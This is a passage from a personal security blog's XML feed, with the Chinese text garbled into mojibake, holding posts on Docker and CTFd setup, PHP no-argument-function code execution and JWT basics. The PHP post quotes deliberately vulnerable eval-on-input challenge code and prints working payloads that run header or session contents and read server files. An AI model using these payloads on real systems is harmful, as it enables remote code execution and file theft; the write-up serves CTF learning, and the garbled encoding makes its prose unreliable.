class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">&quot;registry-mirrors&quot;: [&quot;http:&#x2F;&#x2F;hub-mirror.c.163.com&quot;]</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å†é‡å¯å³å¯</p><h2 id="dockeråŸºæœ¬ä½¿ç”¨"><a href="#dockeråŸºæœ¬ä½¿ç”¨" class="headerlink" title="dockeråŸºæœ¬ä½¿ç”¨"></a>dockeråŸºæœ¬ä½¿ç”¨</h2><p>dokeréƒ¨ç½²çš„ä¸œè¥¿åˆ†ä¸ºé•œåƒå’Œå®¹å™¨ä¸¤ç§ï¼Œæœ‰ä»€ä¹ˆåŒºåˆ«å‘¢ï¼Ÿ</p><p><strong>é•œåƒï¼š</strong></p><p>å¤šä¸ªåªè¯»å±‚å åŠ åœ¨ä¸€èµ·ï¼Œå±‚ä¸å±‚ä¹‹é—´é€šè¿‡æŒ‡é’ˆå…³è”ï¼Œè¿™äº›å±‚èƒ½å¤Ÿåœ¨è¿è¡ŒDockerçš„å®¿ä¸»æœºçš„æ–‡ä»¶ç³»ç»Ÿä¸Šè®¿é—®åˆ°</p><p><strong>å®¹å™¨ï¼š</strong></p><p>å®¹å™¨å’Œå®¹å™¨é•œåƒä¸€æ ·ï¼Œä¹Ÿæ˜¯è‹¥å¹²å±‚çš„å åŠ ï¼Œå”¯ä¸€åŒºåˆ«æ˜¯æ‰€æœ‰åªè¯»å±‚çš„æœ€ä¸Šé¢ä¸€å±‚ï¼Œæ˜¯ä¸€å±‚å¯è¯»å¯å†™å±‚ï¼Œåˆå­¦è€…å¯ä»¥è®°ä½è¿™ä¸ªç®€å•çš„å…¬å¼ï¼šå®¹å™¨ = å®¹å™¨é•œåƒ + å¯è¯»å¯å†™å±‚</p><h3 id="dockeré•œåƒå¸¸è§å‘½ä»¤"><a href="#dockeré•œåƒå¸¸è§å‘½ä»¤" class="headerlink" title="dockeré•œåƒå¸¸è§å‘½ä»¤"></a>dockeré•œåƒå¸¸è§å‘½ä»¤</h3><p>æŸ¥çœ‹æ‰€æœ‰ä¸‹è½½çš„é•œåƒï¼š</p><pre><code>sudo docker images</code></pre><p>æœç´¢é•œåƒï¼š</p><pre><code>sudo docker search é•œåƒåç§°</code></pre><p>è·å–é•œåƒï¼š</p><pre><code>sudo docker pull é•œåƒåç§°</code></pre><p>è¿è¡Œé•œåƒï¼š</p><pre><code>sudo docker run -d --name å®¹å™¨åç§° -p 80:80 é•œåƒåç§°-dï¼šåå°è¿è¡Œ-nameï¼šå®¹å™¨åç§°(è‡ªå·±å‘½å)-pï¼šæŒ‡å®šdockerè¿è¡Œæ­¤é•œåƒæ‰€ä½¿ç”¨çš„ç«¯å£ï¼Œç¬¬ä¸€ä¸ªæ˜¯å¤–ç½‘ç«¯å£ï¼Œç¬¬äºŒä¸ªæ˜¯å†…ç½‘ç«¯å£â€“privilegedï¼šä½¿ç”¨è¯¥å‚æ•°ï¼Œcontainerå†…çš„rootæ‹¥æœ‰çœŸæ­£çš„rootæƒé™-iï¼šä»¥äº¤äº’æ¨¡å¼è¿è¡Œå®¹å™¨-tï¼šä¸ºå®¹å™¨é‡æ–°åˆ†é…ä¸€ä¸ªä¼ªè¾“å…¥ç»ˆç«¯â€“link å…¶ä»–å®¹å™¨ï¼šå°†è¯¥å®¹å™¨ä¸å…¶ä»–å®¹å™¨è¿›è¡Œè¿æ¥</code></pre><p>åˆ é™¤é•œåƒï¼š</p><pre><code>sudo docker rmi -f IMAGE-ID/name</code></pre><p>å…¶ä¸­ï¼ŒIMAGE-IDå¯åœ¨é•œåƒåˆ—è¡¨ä¸­æŸ¥çœ‹ï¼›åªéœ€ä½¿ç”¨IMAGE IDå‰å››ä½å³å¯ï¼›ä¹Ÿå¯ä»¥ä½¿ç”¨é•œåƒçš„åå­—</p><h3 id="dockerå®¹å™¨å¸¸è§å‘½ä»¤"><a href="#dockerå®¹å™¨å¸¸è§å‘½ä»¤" class="headerlink" title="dockerå®¹å™¨å¸¸è§å‘½ä»¤"></a>dockerå®¹å™¨å¸¸è§å‘½ä»¤</h3><p>æŸ¥çœ‹å®¹å™¨åˆ—è¡¨ï¼š</p><pre><code>sudo docker ps -a</code></pre><p>åœæ­¢å®¹å™¨ï¼š</p><pre><code>sudo docker stop CONTAINER-ID/name</code></pre><p>å…¶ä¸­ï¼ŒCONTAINER IDå¯åœ¨å®¹å™¨åˆ—è¡¨ä¸­æŸ¥çœ‹ï¼›åªéœ€ä½¿ç”¨CONTAINER IDå‰å››ä½å³å¯ï¼›ä¹Ÿå¯ä»¥ä½¿ç”¨è¿è¡Œé•œåƒæ—¶æ‰€å‘½åçš„å®¹å™¨åå­—</p><p>è¿è¡Œå®¹å™¨ï¼š</p><pre><code>sudo docker start CONTAINER-ID/name</code></pre><p>åˆ é™¤å®¹å™¨(å®¹å™¨éœ€å·²åœæ­¢è¿è¡Œ)ï¼š</p><pre><code>sudo docker rm CONTAINER-ID/name</code></pre><p>è¿›å…¥å®¹å™¨(ä¸çŸ¥é“ä»€ä¹ˆåŸå› ï¼Œä½¿ç”¨docker attachå‘½ä»¤æ— æ³•è¿›å…¥åˆ°å®¹å™¨ä¸­ï½)</p><pre><code>sudo docker exec -it CONTAINER-ID/name /bin/bash</code></pre><p>ä¸èƒ½ç”¨çš„è¯å¯ä»¥è¯•è¯•</p><pre><code>sudo docker exec -it  CONTAINER-ID/name /bin/sh sudo docker exec -it  CONTAINER-ID/name bash</code></pre><p>æ‹·è´æ–‡ä»¶</p><pre><code>docker cp ~/index.php å®¹å™¨id:/var/www/html</code></pre><h2 id="åŠ¨æ€é¶æœºæ­å»º"><a href="#åŠ¨æ€é¶æœºæ­å»º" class="headerlink" title="åŠ¨æ€é¶æœºæ­å»º"></a>åŠ¨æ€é¶æœºæ­å»º</h2><h2 id="åŠ¨æ€flagæ­å»º"><a href="#åŠ¨æ€flagæ­å»º" class="headerlink" title="åŠ¨æ€flagæ­å»º"></a>åŠ¨æ€flagæ­å»º</h2><p>å¯ä»¥å‚è§è¿™å‡ ä½å¤§ä½¬çš„æ–‡ç« </p><p><a href="https://www.zhaoj.in/read-6333.html">https://www.zhaoj.in/read-6333.html</a><br><a href="http://www.gtfly.top/2019/09/27/CTFd%E5%8A%A8%E6%80%81docker%E9%95%9C%E5%83%8F%E7%BC%96%E5%86%99.html">http://www.gtfly.top/2019/09/27/CTFdåŠ¨æ€dockeré•œåƒç¼–å†™.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTFd </tag>
            
            <tag> docker </tag>
            
            <tag> ç¯å¢ƒæ­å»º </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phpæ— å‚æ•°å‡½æ•°åˆ©ç”¨</title>
      <link href="2019/11/12/php-nopara-rce/"/>
      <url>2019/11/12/php-nopara-rce/</url>
      
        <content type="html"><![CDATA[<p>æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†phpæ— å‚æ•°å‡½æ•°åˆ©ç”¨çš„ä¸€äº›æ–¹æ³•ï¼Œä»¥åŠå®ç°rceçš„ç¤ºä¾‹ï¼</p><a id="more"></a><h2 id="ä¸€é“æœ‰æ„æ€çš„é¢˜"><a href="#ä¸€é“æœ‰æ„æ€çš„é¢˜" class="headerlink" title="ä¸€é“æœ‰æ„æ€çš„é¢˜"></a>ä¸€é“æœ‰æ„æ€çš„é¢˜</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(&#39;;&#39; &#x3D;&#x3D;&#x3D; preg_replace(&#39;&#x2F;[^\W]+\((?R)?\)&#x2F;&#39;, &#39;&#39;, $_GET[&#39;code&#39;])) &#123;    </span><br><span class="line">    eval($_GET[&#39;code&#39;]);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ†æä¸€ä¸‹æ­£åˆ™éƒ¨åˆ†:</p><p><code>\W</code>åŒ¹é…ä»»ä½•ä¸€ä¸ªå­—æ¯æˆ–è€…æ•°å­—æˆ–è€…ä¸‹åˆ’çº¿ä»¥å¤–çš„å­—ç¬¦</p><p><code>[]</code>ä»£è¡¨å­—ç¬¦é›†</p><p><code>[^\W]</code>è¡¨ç¤ºåªèƒ½åŒ¹é…ä»»ä½•ä¸€ä¸ªå­—æ¯æˆ–è€…æ•°å­—æˆ–è€…ä¸‹åˆ’çº¿ï¼Œ<code>^[abc]</code>åˆ™è¡¨ç¤ºåŒ¹é…ä»¥aæˆ–bæˆ–cå¼€å¤´çš„</p><p><code>+</code>è¡¨ç¤ºåŒ¹é…å‰é¢çš„å­è¡¨è¾¾å¼ä¸€æ¬¡æˆ–å¤šæ¬¡ï¼Œ<code>*</code>è¡¨ç¤ºåŒ¹é…å‰é¢çš„å­è¡¨è¾¾å¼é›¶æ¬¡æˆ–å¤šæ¬¡ï¼Œ<code>?</code>è¡¨ç¤ºåŒ¹é…å‰é¢çš„å­è¡¨è¾¾å¼é›¶æ¬¡æˆ–ä¸€æ¬¡</p><p>åé¢çš„<code>\(</code>å’Œ<code>\)</code>è¡¨ç¤ºæ‹¬å·çš„è½¬ä¹‰</p><p><code>(?R)?</code>è¡¨ç¤ºå¼•ç”¨å½“å‰è¡¨è¾¾å¼çš„æ„æ€</p><p>è¿™ä¸ªæ­£åˆ™è¡¨ç¤ºçš„æ„æ€å¤§æ¦‚å°±æ˜¯ï¼šåŒ¹é…æ— å‚æ•°çš„å‡½æ•°æˆ–è€…åµŒå¥—å‡½æ•°ï¼Œä¾‹å¦‚<code>phpinfo()</code></p><p>è¿™é“é¢˜åªè¦èƒ½æ„é€ ç±»ä¼¼æ— å‚å‡½æ•°ï¼Œå°±å¯ä»¥æ‰§è¡Œä¼ è¿‡å»çš„å†…å®¹</p><h2 id="è§£é¢˜æ–¹æ³•"><a href="#è§£é¢˜æ–¹æ³•" class="headerlink" title="è§£é¢˜æ–¹æ³•"></a>è§£é¢˜æ–¹æ³•</h2><h3 id="getallheaders"><a href="#getallheaders" class="headerlink" title="getallheaders()"></a>getallheaders()</h3><p><img src="/2019/11/12/php-nopara-rce/20191125164210.png"></p><p>ä¸€èˆ¬çš„payload:</p><pre><code>eval(end(getallheaders()))        //è·å–httpè¯·æ±‚å¤´ä¸­æœ€åä¸€ä¸ªå‚æ•°çš„å€¼ï¼Œå¹¶æ‰§è¡Œ</code></pre><p>å…³äºendå‡½æ•°ï¼š</p><p><img src="/2019/11/12/php-nopara-rce/20191125164622.png"></p><p>åŒæ ·çš„æœ‰ç±»ä¼¼çš„å‡½æ•°</p><p><img src="/2019/11/12/php-nopara-rce/20191125170718.png"></p><p>åˆ©ç”¨çš„æ—¶å€™å¯ä»¥ç›´æ¥bpæŠ“åŒ…åœ¨httpå¤´æœ€åé¢åŠ ä¸Šè¦æ‰§è¡Œçš„ä»£ç </p><p><img src="/2019/11/12/php-nopara-rce/20191125164947.png"></p><h3 id="getenv"><a href="#getenv" class="headerlink" title="getenv()"></a>getenv()</h3><p><img src="/2019/11/12/php-nopara-rce/20191125171136.png"></p><p>ä¸€èˆ¬çš„payload:</p><pre><code>eval(arrar_rand(array_flip(getenv())))    //è·å–æ‰€æœ‰ç¯å¢ƒå˜é‡ï¼Œè¿”å›ä¸€ä¸ªæ•°ç»„ï¼Œåè½¬é”®å€¼ï¼Œéšæœºå…¶ä¸­ä¸€ä¸ªæ‰§è¡Œ</code></pre><p><code>array_flip()</code>å‡½æ•°ï¼š</p><p><img src="/2019/11/12/php-nopara-rce/20191125173516.png"></p><p><code>array_rand()</code>å‡½æ•°ï¼š</p><p><img src="/2019/11/12/php-nopara-rce/20191125173741.png"></p><p>ä¸€èˆ¬ä¸ä¸‹é¢çš„è¶…å…¨å±€å˜é‡ç»“åˆï¼Œå¯ä»¥ç”¨çˆ†ç ´çš„æ–¹å¼æ¥æ‰§è¡Œæ¶æ„å‚æ•°</p><pre><code>$GLOBALS$_SERVER$_GET$_POST$_FILES$_COOKIE$_SESSION$_REQUEST$_ENV    //ç­‰ä»·äºgetenv()å‡½æ•°</code></pre><h3 id="get-defined-vars"><a href="#get-defined-vars" class="headerlink" title="get_defined_vars()"></a>get_defined_vars()</h3><p><img src="/2019/11/12/php-nopara-rce/20191126202817.png"></p><p><img src="/2019/11/12/php-nopara-rce/20191126203822.png"></p><p>ä¸€èˆ¬çš„payloadï¼š</p><pre><code>eval(reset(current(get_defined_vars())))    </code></pre><p><code>current()</code>å‡½æ•°ï¼š</p><p><img src="/2019/11/12/php-nopara-rce/20191126204319.png"></p><p><code>reset</code>å‡½æ•°ï¼š</p><p><img src="/2019/11/12/php-nopara-rce/20191126204440.png"></p><p>ä¸€èˆ¬ä¸ä¸‹é¢çš„è¶…å…¨å±€å˜é‡ç»“åˆï¼Œå¯ä»¥ç”¨çˆ†ç ´çš„æ–¹å¼æ¥æ‰§è¡Œæ¶æ„å‚æ•°</p><pre><code>$GLOBALS$_SERVER$_GET$_POST$_FILES$_COOKIE$_SESSION$_REQUEST$_ENV    //ç­‰ä»·äºgetenv()å‡½æ•°</code></pre><h3 id="session-id"><a href="#session-id" class="headerlink" title="session_id()"></a>session_id()</h3><p><img src="/2019/11/12/php-nopara-rce/20191126204727.png"></p><p>å› ä¸ºPHPSESSIDå¿…é¡»ä¸ºå¤§å°å†™å­—æ¯ã€æ•°å­—ã€ä¸‹åˆ’çº¿æ„æˆçš„å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ç»•è¿‡ï¼Œå¯ä»¥å…ˆå¯¹æ‰§è¡Œçš„ä»£ç åå…­è¿›åˆ¶è½¬æ¢ï¼Œå†ç”¨<code>hex2bin()</code>å‡½æ•°è½¬æ¢è¿‡æ¥ï¼Œ<code>706870696e666f28293b</code>æ˜¯<code>phpinfo();</code>åå…­è¿›åˆ¶å½¢å¼</p><p><img src="/2019/11/12/php-nopara-rce/20191126212227.png"></p><p>æˆåŠŸè¿”å›phpinfo</p><p>ä¸€èˆ¬çš„payload:</p><pre><code>eval(hex2bin(session_id(session_start())))</code></pre><p><code>hex2bin()</code>å‡½æ•°ï¼š</p><p><img src="/2019/11/12/php-nopara-rce/20191126210821.png"></p><h2 id="å¸¸ç”¨payload"><a href="#å¸¸ç”¨payload" class="headerlink" title="å¸¸ç”¨payload"></a>å¸¸ç”¨payload</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">è¯»æ–‡ä»¶ï¼š</span><br><span class="line">readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv())))))))))))</span><br></pre></td></tr></table></figure><h2 id="GXY-å®‰æ’æœˆèµ›"><a href="#GXY-å®‰æ’æœˆèµ›" class="headerlink" title="GXY(å®‰æ’æœˆèµ›)"></a>GXY(å®‰æ’æœˆèµ›)</h2><p>æºç å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flagåœ¨å“ªé‡Œå‘¢ï¼Ÿ&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, $_GET[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, $_GET[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, $_GET[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET[&#x27;exp&#x27;];</span></span><br><span class="line">                @<span class="keyword">eval</span>($_GET[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;è¿˜å·®ä¸€ç‚¹å“¦ï¼&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;å†å¥½å¥½æƒ³æƒ³ï¼&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;è¿˜æƒ³è¯»flagï¼Œè‡­å¼Ÿå¼Ÿï¼&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™é¢˜å°±æ²¡æ³•ç”¨<code>getallheaders()</code>é‚£ç§æ–¹æ³•äº†ï¼Œç›´æ¥ä¸Špayload:</p><pre><code>?exp=readfile(array_rand(array_flip(scandir(current(localeconv())))));</code></pre><p>è§£é‡Šä¸€ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">localeconv()&#x2F;&#x2F;è¿”å›ä¸€åŒ…å«æœ¬åœ°æ•°å­—åŠè´§å¸æ ¼å¼ä¿¡æ¯çš„æ•°ç»„</span><br><span class="line">current()&#x2F;&#x2F;è¿”å›å½“å‰è¢«å†…éƒ¨æŒ‡é’ˆæŒ‡å‘çš„æ•°ç»„å•å…ƒçš„å€¼ï¼Œå¹¶ä¸ç§»åŠ¨æŒ‡é’ˆ</span><br><span class="line">scandir()&#x2F;&#x2F;åˆ—å‡ºæŒ‡å®šè·¯å¾„ä¸­çš„æ–‡ä»¶å’Œç›®å½•</span><br><span class="line">readfile()&#x2F;&#x2F;è¯»å–æ–‡ä»¶å¹¶å†™å…¥åˆ°è¾“å‡ºç¼“å†²</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> phpå‡½æ•° </tag>
            
            <tag> rce </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JWTå­¦ä¹ </title>
      <link href="2019/11/06/json-web-token/"/>
      <url>2019/11/06/json-web-token/</url>
      
        <content type="html"><![CDATA[<p>æœ¬ç¯‡åšå®¢ä¸»è¦è®°å½•äº†JWTæœºåˆ¶çš„å­¦ä¹ è¿‡ç¨‹ï¼</p><a id="more"></a><h2 id="ä»€ä¹ˆæ˜¯JWT"><a href="#ä»€ä¹ˆæ˜¯JWT" class="headerlink" title="ä»€ä¹ˆæ˜¯JWT?"></a>ä»€ä¹ˆæ˜¯JWT?</h2><p>JWTå…¨ç§°JSON WEB Tokenï¼Œæ˜¯ç”¨äºèº«ä»½è®¤è¯çš„</p><p>ä¸ºä»€ä¹ˆè¦æœ‰èº«ä»½è®¤è¯ï¼Ÿ</p><p>ä¸»è¦æ˜¯å› ä¸ºHTTPæ˜¯æ— çŠ¶æ€çš„ï¼ŒåŒæ ·è®©HTTPæœ‰çŠ¶æ€çš„æ–¹å¼è¿˜æœ‰ï¼šsession,cookie</p><h3 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h3><p>cookie æ˜¯ä¸€ä¸ªéå¸¸å…·ä½“çš„ä¸œè¥¿ï¼ŒæŒ‡çš„å°±æ˜¯æµè§ˆå™¨é‡Œé¢èƒ½æ°¸ä¹…å­˜å‚¨çš„ä¸€ç§æ•°æ®ã€‚è·ŸæœåŠ¡å™¨æ²¡å•¥å…³ç³»ï¼Œä»…ä»…æ˜¯æµè§ˆå™¨å®ç°çš„ä¸€ç§æ•°æ®å­˜å‚¨åŠŸèƒ½ã€‚</p><p>cookieç”±æœåŠ¡å™¨ç”Ÿæˆï¼Œå‘é€ç»™æµè§ˆå™¨ï¼Œæµè§ˆå™¨æŠŠcookieä»¥KVå½¢å¼å­˜å‚¨åˆ°æŸä¸ªç›®å½•ä¸‹çš„æ–‡æœ¬æ–‡ä»¶ä¸­ï¼Œä¸‹ä¸€æ¬¡è¯·æ±‚åŒä¸€ç½‘ç«™æ—¶ä¼šæŠŠè¯¥cookieå‘é€ç»™æœåŠ¡å™¨ã€‚ç”±äºcookieæ˜¯å­˜åœ¨å®¢æˆ·ç«¯ä¸Šçš„ï¼Œæ‰€ä»¥æµè§ˆå™¨åŠ å…¥äº†ä¸€äº›é™åˆ¶ç¡®ä¿cookieä¸ä¼šè¢«æ¶æ„ä½¿ç”¨ï¼ŒåŒæ—¶ä¸ä¼šå æ®å¤ªå¤šç£ç›˜ç©ºé—´ã€‚æ‰€ä»¥æ¯ä¸ªåŸŸçš„cookieæ•°é‡æ˜¯æœ‰é™åˆ¶çš„ã€‚</p><h3 id="Session"><a href="#Session" class="headerlink" title="Session"></a>Session</h3><p>sessionä»å­—é¢ä¸Šè®²ï¼Œå°±æ˜¯ä¼šè¯ã€‚è¿™ä¸ªå°±ç±»ä¼¼ä½ å’Œä¸€ä¸ªäººäº¤è°ˆï¼Œä½ æ€ä¹ˆçŸ¥é“å½“æ—¶å’Œä½ äº¤è°ˆçš„æ˜¯å¼ ä¸‰è€Œä¸æ˜¯æå››å‘¢ï¼Ÿå¯¹æ–¹è‚¯å®šæœ‰æŸç§ç‰¹å¾ï¼ˆé•¿ç›¸ç­‰ï¼‰è¡¨æ˜ä»–æ˜¯å¼ ä¸‰ï¼›</p><p>sessionä¹Ÿæ˜¯ç±»ä¼¼çš„é“ç†ï¼ŒæœåŠ¡å™¨è¦çŸ¥é“å½“å‰è¯·æ±‚å‘ç»™è‡ªå·±çš„æ˜¯è°ã€‚ä¸ºäº†åšè¿™ç§åŒºåˆ†ï¼ŒæœåŠ¡å™¨å°±æ˜¯è¦ç»™æ¯ä¸ªå®¢æˆ·ç«¯åˆ†é…ä¸åŒçš„â€èº«ä»½æ ‡è¯†â€ï¼Œç„¶åå®¢æˆ·ç«¯æ¯æ¬¡å‘æœåŠ¡å™¨å‘è¯·æ±‚çš„æ—¶å€™ï¼Œéƒ½å¸¦ä¸Šè¿™ä¸ªâ€èº«ä»½æ ‡è¯†â€œï¼ŒæœåŠ¡å™¨å°±çŸ¥é“è¿™ä¸ªè¯·æ±‚æ¥è‡ªä¸è°äº†ã€‚è‡³äºå®¢æˆ·ç«¯æ€ä¹ˆä¿å­˜è¿™ä¸ªâ€èº«ä»½æ ‡è¯†â€œï¼Œå¯ä»¥æœ‰å¾ˆå¤šæ–¹å¼ï¼Œå¯¹äºæµè§ˆå™¨å®¢æˆ·ç«¯ï¼Œå¤§å®¶éƒ½é‡‡ç”¨cookieçš„æ–¹å¼ã€‚</p><h2 id="Json-Web-Tokenç»“æ„"><a href="#Json-Web-Tokenç»“æ„" class="headerlink" title="Json Web Tokenç»“æ„"></a>Json Web Tokenç»“æ„</h2><p>JSON Web Tokensç”±dotï¼ˆ.ï¼‰åˆ†éš”çš„ä¸‰ä¸ªéƒ¨åˆ†ç»„æˆï¼Œå®ƒä»¬æ˜¯ï¼š</p><ol><li>Headerï¼ˆå¤´éƒ¨ï¼‰</li><li>Payloadï¼ˆè´Ÿè½½ï¼‰</li><li>Signatureï¼ˆç­¾åï¼‰</li></ol><p>å› æ­¤ï¼ŒJWTé€šå¸¸å¦‚ä¸‹å±•ç¤ºï¼š</p><pre><code>xxxxx.yyyyy.zzzz</code></pre><p><img src="/2019/11/06/json-web-token/16b4fb176b42367c.png"></p><p><strong>ç»„æˆ:</strong></p><ol><li>uid: ç”¨æˆ·å”¯ä¸€èº«ä»½æ ‡è¯†</li><li>time: å½“å‰æ—¶é—´çš„æ—¶é—´æˆ³</li><li>sign: ç­¾å, ä½¿ç”¨ hash/encrypt å‹ç¼©æˆå®šé•¿çš„åå…­è¿›åˆ¶å­—ç¬¦ä¸²ï¼Œä»¥é˜²æ­¢ç¬¬ä¸‰æ–¹æ¶æ„æ‹¼æ¥</li><li>å›ºå®šå‚æ•°(å¯é€‰): å°†ä¸€äº›å¸¸ç”¨çš„å›ºå®šå‚æ•°åŠ å…¥åˆ° token ä¸­æ˜¯ä¸ºäº†é¿å…é‡å¤æŸ¥åº“</li></ol><p><strong>Headerï¼ˆå¤´éƒ¨ï¼‰</strong></p><pre><code>Header æ˜¯ä¸€ä¸ª JSON å¯¹è±¡&#123;  &quot;alg&quot;: &quot;HS256&quot;, // è¡¨ç¤ºç­¾åçš„ç®—æ³•ï¼Œé»˜è®¤æ˜¯ HMAC SHA256ï¼ˆå†™æˆ HS256ï¼‰  &quot;typ&quot;: &quot;JWT&quot;  // è¡¨ç¤ºTokençš„ç±»å‹ï¼ŒJWT ä»¤ç‰Œç»Ÿä¸€å†™ä¸ºJWT&#125;</code></pre><p><strong>Payloadï¼ˆè´Ÿè½½ï¼‰</strong></p><pre><code>Payload éƒ¨åˆ†ä¹Ÿæ˜¯ä¸€ä¸ª JSON å¯¹è±¡ï¼Œç”¨æ¥å­˜æ”¾å®é™…éœ€è¦ä¼ é€’çš„æ•°æ®&#123;  // 7ä¸ªå®˜æ–¹å­—æ®µ  &quot;iss&quot;: &quot;a.com&quot;, // issuerï¼šç­¾å‘äºº  &quot;exp&quot;: &quot;1d&quot;, // expiration timeï¼š è¿‡æœŸæ—¶é—´  &quot;sub&quot;: &quot;test&quot;, // subject: ä¸»é¢˜  &quot;aud&quot;: &quot;xxx&quot;, // audienceï¼š å—ä¼—  &quot;nbf&quot;: &quot;xxx&quot;, // Not Beforeï¼šç”Ÿæ•ˆæ—¶é—´  &quot;iat&quot;: &quot;xxx&quot;, // Issued Atï¼š ç­¾å‘æ—¶é—´  &quot;jti&quot;: &quot;1111&quot;, // JWT IDï¼šç¼–å·  // å¯ä»¥å®šä¹‰ç§æœ‰å­—æ®µ  &quot;name&quot;: &quot;John Doe&quot;,  &quot;admin&quot;: true&#125;</code></pre><p>JWT é»˜è®¤æ˜¯ä¸åŠ å¯†çš„ï¼Œä»»ä½•äººéƒ½å¯ä»¥è¯»åˆ°ï¼Œæ‰€ä»¥ä¸è¦æŠŠç§˜å¯†ä¿¡æ¯æ”¾åœ¨è¿™ä¸ªéƒ¨åˆ†ã€‚</p><p><strong>Signatureï¼ˆç­¾åï¼‰</strong></p><p>Signature æ˜¯å¯¹å‰ä¸¤éƒ¨åˆ†çš„ç­¾åï¼Œé˜²æ­¢æ•°æ®è¢«ç¯¡æ”¹ã€‚</p><p>é¦–å…ˆï¼Œéœ€è¦æŒ‡å®šä¸€ä¸ªå¯†é’¥(secret)ã€‚è¿™ä¸ªå¯†é’¥åªæœ‰æœåŠ¡å™¨æ‰çŸ¥é“ï¼Œä¸èƒ½æ³„éœ²ç»™ç”¨æˆ·ã€‚ç„¶åï¼Œä½¿ç”¨Headeré‡Œé¢æŒ‡å®šçš„ç­¾åç®—æ³•ï¼ˆé»˜è®¤æ˜¯ HMAC SHA256ï¼‰ï¼ŒæŒ‰ç…§ä¸‹é¢çš„å…¬å¼äº§ç”Ÿç­¾åã€‚</p><pre><code>HMACSHA256(base64UrlEncode(header) + &quot;.&quot; + base64UrlEncode(payload), secret)</code></pre><p>ç®—å‡ºç­¾ååï¼ŒæŠŠ Headerã€Payloadã€Signature ä¸‰ä¸ªéƒ¨åˆ†æ‹¼æˆä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œæ¯ä¸ªéƒ¨åˆ†ä¹‹é—´ç”¨â€ç‚¹â€ï¼ˆ.ï¼‰åˆ†éš”ï¼Œå°±å¯ä»¥è¿”å›ç»™ç”¨æˆ·ã€‚</p><pre><code>JWT = Base64(Header) + &quot;.&quot; + Base64(Payload) + &quot;.&quot; + $Signature</code></pre><p>å¦‚ä½•ä¿è¯å®‰å…¨ï¼Ÿ</p><ol><li>å‘é€JWTè¦ä½¿ç”¨HTTPSï¼›ä¸ä½¿ç”¨HTTPSå‘é€çš„æ—¶å€™ï¼ŒJWTé‡Œä¸è¦å†™å…¥ç§˜å¯†æ•°æ®</li><li>JWTçš„payloadä¸­è¦è®¾ç½®expireæ—¶é—´</li></ol><h2 id="JWTæ”»å‡»æ‰‹æ®µ"><a href="#JWTæ”»å‡»æ‰‹æ®µ" class="headerlink" 